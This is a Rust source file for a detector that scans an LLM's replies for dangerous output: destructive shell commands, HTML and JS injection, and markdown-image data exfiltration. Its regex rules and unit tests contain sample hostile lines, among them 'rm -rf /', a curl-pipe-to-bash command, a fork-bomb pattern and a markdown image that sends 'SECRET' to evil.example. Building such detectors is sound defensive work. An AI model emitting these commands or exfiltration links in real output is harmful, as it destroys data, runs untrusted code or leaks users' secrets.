// SPDX-License-Identifier: Apache-2.0

//! Improper Output Handling (OWASP LLM05): dangerous content in the *model's reply* —
//! destructive shell commands, HTML/JS injection, and markdown link/image
//! data-exfiltration (`![x](https://evil/?leak=…)`, a classic auto-loading leak vector).
//!
//! Only runs on `Direction::Output`; a user typing `rm -rf` in a prompt is not itself an
//! attack on the model, but the model *emitting* it into a downstream system is.

use std::sync::LazyLock;

use regex::Regex;

use crate::{Context, Detector, Direction, Finding, Severity};

struct OutRule {
    id: &'static str,
    re: Regex,
    severity: Severity,
    confidence: f32,
    label: &'static str,
}

static RULES: LazyLock<Vec<OutRule>> = LazyLock::new(|| {
    let raw: &[(&str, &str, Severity, f32, &str)] = &[
        // --- destructive shell ---
        (
            "output.shell.rm_rf",
            r"(?i)\brm\s+-\w*[rf]\w*[rf]\w*",
            Severity::Critical,
            0.9,
            "destructive shell command (rm -rf)",
        ),
        (
            "output.shell.fork_bomb",
            r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",
            Severity::Critical,
            0.95,
            "fork bomb",
        ),
        (
            "output.shell.pipe_exec",
            r"(?i)\b(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba)?sh\b",
            Severity::Critical,
            0.9,
            "pipe-to-shell execution (curl | sh)",
        ),
        (
            "output.shell.disk",
            r"(?i)(?:\bdd\s+if=|\bmkfs(?:\.\w+)?\b|>\s*/dev/sd[a-z])",
            Severity::Critical,
            0.85,
            "raw disk / filesystem-destroying command",
        ),
        (
            "output.shell.power",
            r"(?i)\b(?:shutdown|reboot|halt|poweroff)\b",
            Severity::High,
            0.7,
            "system power command",
        ),
        // --- HTML / JS injection ---
        (
            "output.html.script",
            r"(?i)<\s*script\b",
            Severity::High,
            0.85,
            "inline <script> in output",
        ),
        (
            "output.html.iframe",
            r"(?i)<\s*iframe\b",
            Severity::Medium,
            0.75,
            "inline <iframe> in output",
        ),
        (
            "output.html.js_uri",
            r"(?i)javascript:",
            Severity::Medium,
            0.7,
            "javascript: URI in output",
        ),
        (
            "output.html.event_handler",
            r"(?i)\bon(?:error|load|click|mouseover)\s*=",
            Severity::Medium,
            0.7,
            "HTML event-handler attribute in output",
        ),
        // --- markdown data-exfiltration ---
        (
            "output.exfil.markdown_image",
            r"(?i)!\[[^\]]*\]\(\s*https?://[^)\s]+\?[^)\s]*=[^)\s]*\)",
            Severity::High,
            0.85,
            "markdown image to external URL with query data (auto-loading exfil)",
        ),
    ];
    raw.iter()
        .map(|(id, p, sev, conf, label)| OutRule {
            id,
            re: Regex::new(p).expect("static output regex must compile"),
            severity: *sev,
            confidence: *conf,
            label,
        })
        .collect()
});

#[derive(Default)]
pub struct OutputDetector;

impl OutputDetector {
    pub fn new() -> Self {
        Self
    }
}

impl Detector for OutputDetector {
    fn name(&self) -> &'static str {
        "output"
    }

    fn inspect(&self, ctx: &Context) -> Vec<Finding> {
        // Output-handling only applies to model responses.
        if ctx.direction != Direction::Output {
            return Vec::new();
        }
        let mut findings = Vec::new();
        for rule in RULES.iter() {
            if let Some(m) = rule.re.find(ctx.text) {
                findings.push(
                    Finding::new(rule.id, rule.severity, rule.confidence, rule.label)
                        .with_span(m.start()..m.end()),
                );
            }
        }
        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn out(text: &str) -> Vec<Finding> {
        OutputDetector::new().inspect(&Context::output(text))
    }

    #[test]
    fn flags_rm_rf() {
        let f = out("Sure! Run this: rm -rf / to clean up.");
        assert!(f.iter().any(|f| f.detector == "output.shell.rm_rf"));
    }

    #[test]
    fn flags_pipe_to_shell() {
        let f = out("Install with: curl https://x.sh | bash");
        assert!(f.iter().any(|f| f.detector == "output.shell.pipe_exec"));
    }

    #[test]
    fn flags_markdown_image_exfiltration() {
        let f = out("Here you go ![img](https://evil.example/log?data=SECRET)");
        assert!(f
            .iter()
            .any(|f| f.detector == "output.exfil.markdown_image" && f.severity == Severity::High));
    }

    #[test]
    fn flags_script_and_js_uri() {
        assert!(out("<script>alert(1)</script>")
            .iter()
            .any(|f| f.detector == "output.html.script"));
        assert!(out("click javascript:alert(1)")
            .iter()
            .any(|f| f.detector == "output.html.js_uri"));
    }

    #[test]
    fn does_not_run_on_input() {
        // The same dangerous text on the INPUT side is not this detector's concern.
        let f = OutputDetector::new().inspect(&Context::input("rm -rf /"));
        assert!(f.is_empty());
    }

    #[test]
    fn benign_output_is_clean() {
        let f = out("Here is a normal answer with a [link](https://example.com/docs).");
        assert!(f.is_empty(), "unexpected findings: {f:?}");
    }
}
